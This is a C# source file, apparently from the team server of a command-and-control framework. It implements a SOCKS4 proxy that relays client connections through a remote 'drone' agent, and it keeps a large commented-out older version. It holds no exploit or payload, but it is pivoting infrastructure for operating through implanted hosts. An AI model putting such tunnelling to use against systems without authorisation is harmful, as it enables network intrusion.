using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using BinarySerializer;
using Common;
using Shared;
using TeamServer.Helper;
using TeamServer.Services;

namespace TeamServer.Forwarding
{
    public sealed class SocksClient
    {
        public string Id { get; private set; }
        public TcpClient Tcp { get; private set; }
        private readonly ManualResetEvent _signal = new ManualResetEvent(false);
        public Queue<byte[]> DataQueue { get; private set; } = new Queue<byte[]>();
        public bool? ConnexionResult { get; private set; } = null;
        


        public SocksClient(TcpClient client)
        {
            this.Id = ShortGuid.NewGuid();
            this.Tcp = client;
        }

        public void QueueData(byte[] data)
        {
            DataQueue.Enqueue(data);
        }

        public void Unblock(bool connectionSucceed)
        {
            ConnexionResult = connectionSucceed;
            _signal.Set();
        }

        public void WaitConnectionResult()
        {
            _signal.WaitOne();
        }
    }


    public sealed class SocksProxy
    {
        public string AgentId { get; set; }
        public int BindPort { get; set; }

        public bool IsRunning { get; private set; }

        private readonly IFrameService _frameService;

        private readonly CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private Dictionary<string, SocksClient> _socksClients = new Dictionary<string, SocksClient>();

        public SocksClient GetSocksClient(string socksProxyId)
        {
            if(!_socksClients.ContainsKey(socksProxyId))
                return null;

            return _socksClients[socksProxyId];
        }

        public SocksProxy(string agentId, int port, IFrameService frameService)
        {
            this.AgentId = agentId;
            this.BindPort = port;
            this._frameService = frameService;
        }

        public async Task Start()
        {
            this.IsRunning = true;
            var listener = new TcpListener(new IPEndPoint(IPAddress.Any, BindPort));
            listener.Start(100);

            while (!_tokenSource.IsCancellationRequested)
            {
                // wait for client
                // this will throw an OperationCancelledException if the token is cancelled
                try
                {
                    var client = await listener.AcceptTcpClientAsync(_tokenSource.Token);

                    // handle client in new thread
                    var thread = new Thread(HandleClient);

                    var sockClient = new SocksClient(client);
                    this._socksClients.Add(sockClient.Id, sockClient);

                    thread.Start(sockClient);
                }
                catch (OperationCanceledException)
                {
                    // ignore and proceed to stop the listener
                }
            }

            listener.Stop();
            this.IsRunning = false;
        }

       

        private async void HandleClient(object obj)
        {
            if (obj is not SocksClient client)
                return;

            var stream = client.Tcp.GetStream();

            // first thing is to read the connect request
            var connectReq = await ReadConnectRequest(client);

            // if not version 4, send error
            if (connectReq.Version != 4)
            {
                await SendConnectReply(stream, false);
                return;
            }

            // otherwise, send "connect" task to drone
            var packet = new Socks4Packet(client.Id, Socks4Packet.PacketType.CONNECT, connectReq.BinarySerializeAsync().Result);
            _frameService.CacheFrame(AgentId, Shared.NetFrameType.Socks, packet);

            // wait for confirmation from drone
            client.WaitConnectionResult();

            if(client.ConnexionResult != true)
            {
                client.Tcp.Close();
                client.Tcp.Dispose();
                _socksClients.Remove(client.Id);
                return;
            }

            // send success back to client
            await SendConnectReply(stream, true);

            // drop into a loop
            while (!_tokenSource.IsCancellationRequested)
            {
                // if client has data
                if (client.Tcp.DataAvailable())
                {
                    // read it
                    var data = await stream.ReadStream();

                    // send to the drone
                    packet = new Socks4Packet(client.Id, Socks4Packet.PacketType.DATA, data);
                    _frameService.CacheFrame(AgentId, Shared.NetFrameType.Socks, packet);

                    // wait for response
                    byte[] response;
                    while (!client.DataQueue.TryDequeue(out response))
                    {
                        await Task.Delay(100);

                        if (_tokenSource.IsCancellationRequested)
                            break;
                    }

                    await stream.WriteStream(response);
                }

                await Task.Delay(100);
            }

            // send a disconnect
            packet = new Socks4Packet(client.Id, Socks4Packet.PacketType.DISCONNECT);
            _frameService.CacheFrame(AgentId, NetFrameType.Socks, packet);

            _socksClients.Remove(client.Id);
            client.Tcp.Dispose();
        }

        private async Task<Socks4ConnectRequest> ReadConnectRequest(SocksClient client)
        {
            var data = await client.Tcp.GetStream().ReadStream();
            return new Socks4ConnectRequest(data) { Id = client.Id };
        }

        private static async Task SendConnectReply(Stream stream, bool success)
        {
            var reply = new byte[]
            {
            0x00,
            success ? (byte)0x5a : (byte)0x5b,
            0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
            };

            await stream.WriteStream(reply);
        }

        public async Task Stop()
        {
            _tokenSource.Cancel();
        }

        /*public static implicit operator SocksProxy(SocksRequest request)
        {
            return new SocksProxy
            {
                Id = Helpers.GenerateShortGuid(),
                DroneId = request.DroneId,
                BindPort = request.BindPort
            };
        }

        public static implicit operator SocksResponse(SocksProxy socksProxy)
        {
            return new SocksResponse
            {
                Id = socksProxy.Id,
                DroneId = socksProxy.DroneId,
                BindPort = socksProxy.BindPort
            };
        }*/
    }




    /*public static class TcpClientExtensions
    {
        public static bool DataAvailable(this TcpClient client)
        {
            var ns = client.GetStream();
            return ns.DataAvailable;
        }

        public static bool IsAlive(this TcpClient client)
        {
            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnections = ipProperties.GetActiveTcpConnections().Where(x => x.LocalEndPoint.Equals(client.Client.LocalEndPoint) && x.RemoteEndPoint.Equals(client.Client.RemoteEndPoint)).ToArray();
            if (tcpConnections != null && tcpConnections.Length > 0)
            {
                TcpState stateOfConnection = tcpConnections.First().State;
                if (stateOfConnection == TcpState.Established)
                {
                    return true;
                    // Connection is OK
                }
            }
            return false;
        }

        public static async Task<TcpClient> AcceptTcpClientAsync(this TcpListener listener, CancellationTokenSource cts)
        {
            using (cts.Token.Register(listener.Stop))
            {
                try
                {
                    var client = await listener.AcceptTcpClientAsync().ConfigureAwait(false);
                    return client;
                }
                catch (ObjectDisposedException ex)
                {
                    // Token was canceled - swallow the exception and return null
                    if (cts.Token.IsCancellationRequested) return null;
                    throw ex;
                }
            }
        }

        public static byte[] ReceivedData(this TcpClient client)
        {
            // Get the client's NetworkStream
            var stream = client.GetStream();

            // Check if data is available to be read
            if (stream.DataAvailable)
            {
                // Read data from the stream
                //Logger.Log($"StreamSize = {stream.Length}");
                // Read data from the stream

                var data = new byte[0];
                var buffer = new byte[1024];
                int bytesRead;
                do
                {
                    bytesRead = stream.Read(buffer, 0, buffer.Length);

                    // Return the data that was read
                    var index = data.Length;
                    Array.Resize(ref data, index + bytesRead);
                    Array.Copy(buffer, 0, data, index, bytesRead);
                }
                while (bytesRead == buffer.Length);
                return data;
            }
            else
            {
                // Return an empty array if no data is available
                return new byte[0];
            }
        }

        public static void SendData(this TcpClient client, byte[] data)
        {
            // Get the client's NetworkStream
            var stream = client.GetStream();

            // Write the data to the stream
            stream.Write(data, 0, data.Length);
        }
    }

    public class ClientWrapper
    {
        public string Id { get; set; }
        public bool AckReceived { get; set; }

        public TcpClient TcpClient { get; set; }
    }

    public class Socks4Proxy
    {
        private readonly int _bindPort;
        private readonly IPAddress _bindAddress;

        private ConcurrentDictionary<string, ClientWrapper> Clients = new();

        private Agent agent;

        public bool IsRunning { get; set; }

        public Socks4Proxy(IPAddress bindAddress = null, int bindPort = 1080)
        {
            _bindPort = bindPort;
            _bindAddress = bindAddress ?? IPAddress.Any;
        }

        private readonly CancellationTokenSource _tokenSource = new CancellationTokenSource();

        public async Task Start(Agent _agent)
        {
            Logger.Log($"Proxy starting for agent {_agent.Id}");
            this.agent = _agent;
            var listener = new TcpListener(_bindAddress, _bindPort);
            listener.Start(100);

            this.IsRunning = true;

            var thread = new Thread(async () => await HandleClients());
            thread.Start();

            while (!_tokenSource.IsCancellationRequested)
            {
                Logger.Log($"Socks5 : waiting for clients");
                // this blocks until a connection is received or token is cancelled
                var client = await listener.AcceptTcpClientAsync(_tokenSource);

                //await this.HandleClient(client);
                var t = new Thread(async () => await HandleClient(client));
                t.Start();

            }
            // handle client in new thread

            listener.Stop();
            this.IsRunning = false;
        }

        private async Task HandleClients()
        {
            throw new NotImplementedException();
//            while (!_tokenSource.IsCancellationRequested)
//            {
//                //Logger.Log($"Socks5 :Handle Clients {this.Clients.Count}");
//                foreach (var key in this.Clients.Keys.ToList())
//                {
//                    var client = this.Clients[key];
//                    try
//                    {
//                        var receivedMessages = this.agent.GetProxyResponses(client.Id);

//                        if (!client.AckReceived)
//                        {
//                            //Logger.Log($"Socks5 : {id} No ack");
//                            if (receivedMessages.Any())
//                            {
//                                //Logger.Log($"Socks5 : {id} Messages received");
//                                client.AckReceived = true;
//                                if (receivedMessages.Any(r => r.ConnexionState))
//                                {
//                                    SendConnectReply(client.TcpClient, true);
//                                    //Logger.Log($"Socks5 : {client.Id} Connection accepted");
//                                }
//                                else
//                                {
//                                    SendConnectReply(client.TcpClient, false);
//                                    //Logger.Log($"Socks5 : {client.Id} Connection refused");
//                                    break;
//                                }
//                            }
//                            else //no message, no ack => waiting
//                                continue;
//                        }

//                        // read from destination
//                        //should read from the agent responses
//                        while (receivedMessages.Any())
//                        {
//                            var mess = receivedMessages.Dequeue();

//                            if (!string.IsNullOrEmpty(mess.Data))
//                            {
//                                var resp = Convert.FromBase64String(mess.Data);

//                                client.TcpClient.SendData(resp);
//                                //Logger.Log($"Socks5 : {client.Id} Dest => Client {resp.Length}");
//                            }

//                            if (!mess.ConnexionState)
//                            {
//                                //Logger.Log($"Socks5 : {client.Id} Connection closed (dest)");
//                                try
//                                {
//                                    client.TcpClient.Close();
//                                }
//                                catch { }

//                                this.Clients.Remove(client.Id, out _);
//                                break;
//                            }
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//#if DEBUG
//                        Console.WriteLine(ex);
//                        //on error (IsAlive or read or write) => close the cleint and send message to endpoint to close
//                        try
//                        {
//                            try
//                            {
//                                client.TcpClient.Close();
//                            }
//                            catch { }
//                            this.Clients.Remove(client.Id, out _);
//                            agent.SendProxyRequest(new SocksMessage()
//                            {
//                                Source = client.Id,
//                                ConnexionState = false
//                            });
//                        }
//                        catch { }
//#endif
//                    }
//                    finally
//                    {
//                        //Console.WriteLine($"{id} : disconnected");
//                    }


//                    try
//                    {
//                        // read from client
//                        if (client.TcpClient.DataAvailable())
//                        {
//                            var req = client.TcpClient.ReceivedData();

//                            // send to destination
//                            //destination.SendData(req);
//                            //Should send data to the agent
//                            agent.SendProxyRequest(new SocksMessage()
//                            {
//                                Source = client.Id,
//                                ConnexionState = true,
//                                Data = Convert.ToBase64String(req)
//                            });

//                            //Logger.Log($"Socks5 : {client.Id} Client => Dest {req.Length}");
//                        }

//                        if (!client.TcpClient.IsAlive())
//                        {
//                            agent.SendProxyRequest(new SocksMessage()
//                            {
//                                Source = client.Id,
//                                ConnexionState = false
//                            });
//                            //Logger.Log($"Socks5 : {client.Id} Connection closed (source)");
//                            this.Clients.Remove(client.Id, out _);
//                            continue;
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//#if DEBUG
//                        Console.WriteLine(ex);
//                        //on error (IsAlive or read or write) => close the cleint and send message to endpoint to close
//                        try
//                        {
//                            try
//                            {
//                                client.TcpClient.Close();
//                            }
//                            catch { }
//                            this.Clients.Remove(client.Id, out _);
//                            agent.SendProxyRequest(new SocksMessage()
//                            {
//                                Source = client.Id,
//                                ConnexionState = false
//                            });
//                        }
//                        catch { }
//#endif
//                    }
//                    // sos cpu

//                }
//                await Task.Delay(10);
//            }
        }

        private async Task HandleClient(TcpClient client)
        {
            throw new NotImplementedException();
            //try
            //{
            //    if (client == null)
            //        return;

            //    var endpoint = (IPEndPoint)client.Client.RemoteEndPoint;
            //    var src = endpoint.Address + ":" + endpoint.Port;

            //    //Console.WriteLine($"{id} : Connected");

            //    //// read data from client
            //    var data = client.ReceivedData();

            //    if (data == null || data.Length == 0)
            //        return;

            //    //// read the first byte, which is the SOCKS version
            //    var version = Convert.ToInt32(data[0]);

            //    // read connect request
            //    var request = Socks4Request.FromBytes(data);

            //    // connect to destination
            //    //var destination = new TcpClient();
            //    //await destination.ConnectAsync(request.DestinationAddress, request.DestinationPort);

            //    var id = src + "|" +  request.DestinationAddress + ":" + request.DestinationPort;

            //    //Logger.Log($"Socks5 : {src} Connection requested to {id}");

            //    agent.SendProxyRequest(new SocksMessage()
            //    {
            //        Source = id,
            //        ConnexionState = true
            //    });

            //    if (this.Clients.TryAdd(id, new ClientWrapper() { TcpClient = client, Id = id }))
            //    {
            //        //Logger.Log($"Socks5 : new client {id} added");
            //    }
            //    else
            //    {
            //        //Logger.Log($"Socks5 : cannot add new client {id}");
            //    }
            //}
            //catch { }
        }


        private void SendConnectReply(TcpClient client, bool success)
        {
            var reply = new byte[]
            {
        0x00,
        success ? (byte)0x5a : (byte)0x5b,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
            };

            client.SendData(reply);
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }
    }

    internal class Socks4Request
    {
        public CommandCode Command { get; private set; }
        public int DestinationPort { get; private set; }
        public IPAddress DestinationAddress { get; private set; }

        public static Socks4Request FromBytes(byte[] raw)
        {
            byte[] adr = new byte[4];
            for (int i = 0; i < 4; i++)
            {
                adr[i] = raw[i+4];
            }

            var request = new Socks4Request
            {
                Command = (CommandCode)raw[1],
                DestinationPort = raw[3] | raw[2] << 8,
                DestinationAddress = new IPAddress(adr)
            };

            // if this is SOCKS4a
            //if (request.DestinationAddress.ToString().StartsWith("0.0.0."))
            //{
            //    var domain = Encoding.UTF8.GetString(raw[9..]);
            //    var lookup = await Dns.GetHostAddressesAsync(domain);

            //    // get the first ipv4 address
            //    request.DestinationAddress = lookup.First(i => i.AddressFamily == AddressFamily.InterNetwork);
            //}

            return request;
        }

        public enum CommandCode : byte
        {
            StreamConnection = 0x01,
            PortBinding = 0x02
        }
    }*/
}
